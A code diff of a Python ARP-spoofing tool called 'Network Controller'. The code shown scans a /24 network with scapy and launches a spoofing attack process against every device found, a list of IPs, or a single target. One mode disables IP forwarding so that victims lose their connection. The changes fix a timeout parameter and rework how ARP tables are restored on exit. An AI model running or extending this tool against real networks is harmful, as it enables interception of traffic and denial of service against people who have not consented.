@@ -67,7 +67,7 @@ def scan_network(ip, timeout=1):
     arp_req = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_broadcast = broadcast / arp_req
-    answered = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
+    answered = scapy.srp(arp_broadcast, timeout=timeout, verbose=False)[0]
     return answered
 
 
@@ -105,6 +105,7 @@ if __name__ == "__main__":
     start = time.time()
     option = get_arguments()
     processes = []
+    targets = []
     print("\n[+][+]\t\tWelcome to Network Controller\t\t[+][+]\n")
     if option.mode == 'd':
         subprocess.call("sudo echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
@@ -118,15 +119,18 @@ if __name__ == "__main__":
             answered = scan_network(option.gateway_ip + "/24", option.timeout)
             print("[+] Found " + str(len(answered)) + " devices in the network.")
             for i in range(len(answered)):
+                targets.append(answered[i][1].psrc)
                 p = mp.Process(target=start_attack, args=(answered[i][1].psrc, option.gateway_ip))
                 p.start()
                 processes.append(p)
         elif option.list_ip:
             for i in range(len(option.list_ip)):
+                targets.append(option.list_ip[i])
                 p = mp.Process(target=start_attack, args=(option.list_ip[i], option.gateway_ip))
                 p.start()
                 processes.append(p)
         else:
+            targets.append(option.target_ip)
             p = mp.Process(target=start_attack, args=(option.target_ip, option.gateway_ip))
             p.start()
             processes.append(p)
@@ -134,15 +138,14 @@ if __name__ == "__main__":
             p.join()
     except KeyboardInterrupt:
         print("\n[+] Detected CTRL + C ...... Resetting ARP Tables ...... Please wait.")
-        if len(processes) > 0:
-            for index, process in enumerate(processes):
-                logging.info("Main    : before joining thread %d.", index)
-                print("Stopping Thread " + str(process))
-                restore_arp_table(process.target_ip, process.target_mac, process.gateway_ip, process.gateway_mac)
-                restore_arp_table(process.gateway_ip, process.gateway_mac, process.target_ip, process.target_mac)
-                process.join()
-                logging.info("Main    : thread %d done", index)
+        for target in targets:
+            restore_arp_table(target, get_mac(target), option.gateway_ip, get_mac(option.gateway_ip))
+            restore_arp_table(option.gateway_ip, get_mac(option.gateway_ip), target, get_mac(target))
         print("[+] ARP Tables Reset Successfully")
+        print("[+] Stopping All Processes")
+        for p in processes:
+            p.join()
+        print("[+] Exiting")
     # if option.all:
     #     print("[+] Spoofing all devices in the network")
     #     print("[+] Scanning network for devices")
